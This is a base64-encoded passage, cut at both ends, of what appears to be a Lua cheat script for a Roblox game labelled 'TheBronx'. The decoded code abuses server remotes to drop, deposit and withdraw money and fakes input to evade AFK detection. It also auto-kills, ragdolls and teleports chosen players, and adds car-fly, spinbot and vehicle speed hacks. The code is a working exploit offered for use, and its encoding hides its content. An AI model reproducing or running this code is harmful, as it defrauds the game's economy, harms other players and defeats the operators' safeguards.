JIdW1hbm9pZCIpCiAgICAgICAgaWYgbm90IGggdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgbG9jYWwgY3VycmVudFNlYXQgPSBoLlNlYXRQYXJ0CgogICAgICAgIGlmIGN1cnJlbnRTZWF0IGFuZCBjdXJyZW50U2VhdDpJc0EoIlZlaGljbGVTZWF0IikgdGhlbgogICAgICAgICAgICBsb2NhbCBuZXdDYXIgPSBjdXJyZW50U2VhdC5QYXJlbnQKICAgICAgICAgICAgaWYgbmV3Q2FyIH49IGxhc3RDYXIgdGhlbgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlRoZUJyb254LmNhcmZseSB0aGVuCiAgICAgICAgICAgICAgICAgICAgU2V0dXAoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UKICAgICAgICAgICAgaWYgbGFzdENhciB0aGVuCiAgICAgICAgICAgICAgICBDbGVhbnVwKCkKICAgICAgICAgICAgICAgIGxhc3RDYXIgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5jYXJmbHkgdGhlbgogICAgICAgIENsZWFudXAoKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgaWYgbm90IGNhciBvciBub3Qgc2VhdCBvciBub3QgaHVtIG9yIG5vdCBodW0uU2VhdFBhcnQgb3IgaHVtLlNlYXRQYXJ0IH49IHNlYXQgdGhlbgogICAgICAgIHJldHVybgogICAgZW5kCgogICAgaWYgbm90IHJvb3QgdGhlbiBTZXR1cCgpIHJldHVybiBlbmQKICAgIGlmIG5vdCBidiBvciBub3QgYmcgdGhlbiBTZXR1cCgpIHJldHVybiBlbmQKCiAgICBsb2NhbCBzcGVlZCA9IENvbmZpZy5UaGVCcm9ueC5jYXJmbHlzcGVlZCBvciAxMjAKICAgIGxvY2FsIGNhbSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCiAgICBsb2NhbCBjYW1Mb29rID0gY2FtLkNGcmFtZS5Mb29rVmVjdG9yCiAgICBsb2NhbCBjYW1SaWdodCA9IGNhbS5DRnJhbWUuUmlnaHRWZWN0b3IKCiAgICBpZiBVSVM6SXNNb3VzZUJ1dHRvblByZXNzZWQoRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMikgdGhlbgogICAgICAgIGJnLkNGcmFtZSA9IENGcmFtZS5sb29rQXQocm9vdC5Qb3NpdGlvbiwgcm9vdC5Qb3NpdGlvbiArIGNhbUxvb2spCiAgICBlbmQKCiAgICBsb2NhbCBtb3ZlID0gVmVjdG9yMy56ZXJvCiAgICBpZiBVSVM6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5XKSB0aGVuIG1vdmUgKz0gY2FtTG9vayBlbmQKICAgIGlmIFVJUzpJc0tleURvd24oRW51bS5LZXlDb2RlLlMpIHRoZW4gbW92ZSAtPSBjYW1Mb29rIGVuZAogICAgaWYgVUlTOklzS2V5RG93bihFbnVtLktleUNvZGUuQSkgdGhlbiBtb3ZlIC09IGNhbVJpZ2h0IGVuZAogICAgaWYgVUlTOklzS2V5RG93bihFbnVtLktleUNvZGUuRCkgdGhlbiBtb3ZlICs9IGNhbVJpZ2h0IGVuZAoKICAgIGlmIG1vdmUuTWFnbml0dWRlID4gMCB0aGVuCiAgICAgICAgYnYuVmVsb2NpdHkgPSBtb3ZlLlVuaXQgKiBzcGVlZAogICAgZWxzZQogICAgICAgIGJ2LlZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICBlbmQKZW5kKQotLW5ldyB0cnkKCgp0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCgogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguQXV0b0Ryb3AgdGhlbgogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGVuZAoKICAgICAgICAKICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiQmFua1Byb2Nlc3NSZW1vdGUiKTpJbnZva2VTZXJ2ZXIoIkRyb3AiLCB0b3N0cmluZyhDb25maWcuVGhlQnJvbnguTW9uZXlBbW91bnQpKQogICAgICAgIGVuZCkKICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgIGVuZAplbmQpKSAgICAgICAgICAgIAoKCi0tYXV0b3Bhc3MKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFRleHRDaGF0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVGV4dENoYXRTZXJ2aWNlIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCgpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCmxvY2FsIGxhc3RTZW5kID0gMApsb2NhbCBsYXN0Q2hlY2sgPSAwCmxvY2FsIGNhY2hlZENsb3Nlc3QgPSBuaWwKCmxvY2FsIE1heFBhc3NEaXN0YW5jZSA9IDI1Cgpsb2NhbCBmdW5jdGlvbiBHZXRDbG9zZXN0UGxheWVyKCkKICAgIGxvY2FsIGNsb3Nlc3QgPSBuaWwKICAgIGxvY2FsIHNob3J0ZXN0ID0gbWF0aC5odWdlCgogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgbm90IGNoYXIgb3Igbm90IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIAogICAgICAgIHJldHVybiBuaWwgCiAgICBlbmQKCiAgICBsb2NhbCBteVBvcyA9IGNoYXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbgoKICAgIGZvciBfLCBwIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBwIH49IExvY2FsUGxheWVyIAogICAgICAgICAgICBhbmQgcC5DaGFyYWN0ZXIgCiAgICAgICAgICAgIGFuZCBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIAogICAgICAgIHRoZW4KICAgICAgICAgICAgbG9jYWwgZGlzdCA9IChwLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uIC0gbXlQb3MpLk1hZ25pdHVkZQogICAgICAgICAgICBpZiBkaXN0IDwgc2hvcnRlc3QgYW5kIGRpc3QgPD0gTWF4UGFzc0Rpc3RhbmNlIHRoZW4gCiAgICAgICAgICAgICAgICBzaG9ydGVzdCA9IGRpc3QKICAgICAgICAgICAgICAgIGNsb3Nlc3QgPSBwCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgcmV0dXJuIGNsb3Nlc3QKZW5kCgoKUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoKICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguYXV0b3Bhc3MgdGhlbiAKICAgICAgICByZXR1cm4gCiAgICBlbmQKCiAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBub3QgY2hhciB0aGVuIHJldHVybiBlbmQKCiAgICBsb2NhbCB0b29sID0gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRvb2wiKQogICAgaWYgbm90IHRvb2wgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgdGlja05vdyA9IHRpY2soKQoKICAgIGlmIHRpY2tOb3cgLSBsYXN0Q2hlY2sgPiAwLjE1IHRoZW4KICAgICAgICBsYXN0Q2hlY2sgPSB0aWNrTm93CiAgICAgICAgY2FjaGVkQ2xvc2VzdCA9IEdldENsb3Nlc3RQbGF5ZXIoKQogICAgZW5kCgogICAgaWYgY2FjaGVkQ2xvc2VzdCBhbmQgdGlja05vdyAtIGxhc3RTZW5kID4gMSB0aGVuCiAgICAgICAgbGFzdFNlbmQgPSB0aWNrTm93CgogICAgICAgIGxvY2FsIGNoYW5uZWwgPSBUZXh0Q2hhdFNlcnZpY2UuVGV4dENoYW5uZWxzOkZpbmRGaXJzdENoaWxkKCJSQlhHZW5lcmFsIikKICAgICAgICBpZiBjaGFubmVsIHRoZW4KICAgICAgICAgICAgY2hhbm5lbDpTZW5kQXN5bmMoIi9wYXNzdG8gIiAuLiBjYWNoZWRDbG9zZXN0Lk5hbWUpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKLS1hdXRvcGFzcyBlbmQKCi0tc3BpbmJvdApsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgc3BpbkFuZ2xlID0gMAoKUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5zcGluYm90dGVyIHRoZW4gcmV0dXJuIGVuZAoKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIGhycCA9IGNoYXIgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaWYgbm90IGhycCB0aGVuIHJldHVybiBlbmQKCiAgICBsb2NhbCBzcGluU3BlZWQgPSBDb25maWcuVGhlQnJvbnguc3BpbmJvdHRlcnNwZWVkIG9yIDMwCgogICAgc3BpbkFuZ2xlID0gKHNwaW5BbmdsZSArIHNwaW5TcGVlZCkgJSAzNjAKCiAgICBocnAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhocnAuUG9zaXRpb24pICogQ0ZyYW1lLkFuZ2xlcygwLCBtYXRoLnJhZChzcGluQW5nbGUpLCAwKQplbmQpCi0tc3BpbmJvdCBlbmQKCi0tIGFudGkgYWZrCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBVSVMgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQpsb2NhbCBSUyA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCgpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCmlmIENvbmZpZy5UaGVCcm9ueC5hbnRpYWZrIHRoZW4KICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgdGFzay53YWl0KDMwKQoKICAgICAgICAgICAgCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIG1vdXNlUG9zID0gVmVjdG9yMi5uZXcobWF0aC5yYW5kb20oMCwgMTAwKSwgbWF0aC5yYW5kb20oMCwgMTAwKSkKICAgICAgICAgICAgICAgIFVJUy5JbnB1dENoYW5nZWQ6RmlyZShVSVMsIEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50LCBtb3VzZVBvcykKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIFVJUy5XaW5kb3dGb2N1c1JlbGVhc2VkOkZpcmUoKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIFVJUy5XaW5kb3dGb2N1c2VkOkZpcmUoKQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAKICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgZmFrZUlucHV0ID0gRW51bS5LZXlDb2RlLlcKICAgICAgICAgICAgICAgIFVJUy5JbnB1dEJlZ2FuOkZpcmUoVUlTLCBmYWtlSW5wdXQsIGZhbHNlKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgICAgICAgICBVSVMuSW5wdXRFbmRlZDpGaXJlKFVJUywgZmFrZUlucHV0LCBmYWxzZSkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kKQplbmQKLS1hbnRpIGFmayBlbmQKCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KC4yNSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LmRlcG9zIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJCYW5rQWN0aW9uIik6RmlyZVNlcnZlcigiZGVwbyIsIHRvc3RyaW5nKENvbmZpZy5UaGVCcm9ueC5EZXBvc2l0QW1vdW50KSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICAKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoLjI1KSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguZHJhd3cgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJCYW5rQWN0aW9uIik6RmlyZVNlcnZlcigid2l0aCIsIHRvc3RyaW5nKENvbmZpZy5UaGVCcm9ueC5XaXRoZHJhd0Ftb3VudCkpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpKSAgICAgIAoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoMSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5BdXRvS2lsbCB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyKSBvciBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyKS5DaGFyYWN0ZXIgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbiBjb250aW51ZSBlbmQgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpOkZpbmRGaXJzdENoaWxkKCJHdW5TY3JpcHRfTG9jYWwiKSB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKS5IZWFsdGggPT0gMCB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiRm9yY2VGaWVsZCIpIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIFJlcXVpcmVTdXBwb3J0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAga2lsbF9ndW4oQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllciwgJ0hlYWQnLCBtYXRoLmh1Z2UpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBEaXN0YW5jZUNoZWNrKFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllciksIDMwMCkgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgT2xkQ0ZyYW1lID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikuQ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpLkNGcmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtpbGxfZ3VuKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIsICdIZWFkJywgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoT2xkQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBraWxsX2d1bihDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyLCAnSGVhZCcsIG1hdGguaHVnZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KDIpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuQXV0b1JhZ2RvbGwgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0Iikgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gY29udGludWUgZW5kICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRvb2wiKTpGaW5kRmlyc3RDaGlsZCgiR3VuU2NyaXB0X0xvY2FsIikgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyKS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSGVhbHRoID09IDAgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKTpHZXRTdGF0ZSgpID09IEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuUGh5c2ljcyB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICBraWxsX2d1bihDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyLCAnUmlnaHRVcHBlckxlZycsIDAuMDEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KCkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5CcmluZ2luZ1BsYXllciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIHRvc3RyaW5nKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpID09IHRvc3RyaW5nKExvY2FsUGxheWVyKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlciBvciBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyKS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikuQ0ZyYW1lID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikuQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMiwgMCwgMCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDApCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlRoZUJyb254LlZlaGljbGVNb2RpZmljYXRpb25zLlNwZWVkRW5hYmxlZCBhbmQgVXNlcklucHV0U2VydmljZTpJc0tleURvd24oRW51bS5LZXlDb2RlLlcpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0eXBlb2YoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSA9PSAiSW5zdGFuY2UiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBIdW1hbm9pZCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSHVtYW5vaWQgYW5kIHR5cGVvZihIdW1hbm9pZCkgPT0gIkluc3RhbmNlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFNlYXRQYXJ0ID0gSHVtYW5vaWQuU2VhdFBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2VhdFBhcnQgYW5kIHR5cGVvZihTZWF0UGFydCkgPT0gIkluc3RhbmNlIiBhbmQgU2VhdFBhcnQ6SXNBKCJWZWhpY2xlU2VhdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlYXRQYXJ0LkFzc2VtYmx5TGluZWFyVmVsb2NpdHkgKj0gVmVjdG9yMy5uZXcoMSArIENvbmZpZy5UaGVCcm9ueC5WZWhpY2xlTW9kaWZpY2F0aW9ucy5TcGVlZFZhbHVlLCAxLCAxICsgQ29uZmlnLlRoZUJyb254LlZlaGljbGVNb2RpZmljYXRpb25zLlNwZWVkVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMCkKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuVGhlQnJvbnguVmVoaWNsZU1vZGlmaWNhdGlvbnMuQnJlYWtFbmFibGVkIGFuZCBVc2VySW5wdXRTZXJ2aWNlOklzS2V5RG93bihFbnVtLktleUNvZGUuUykgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAg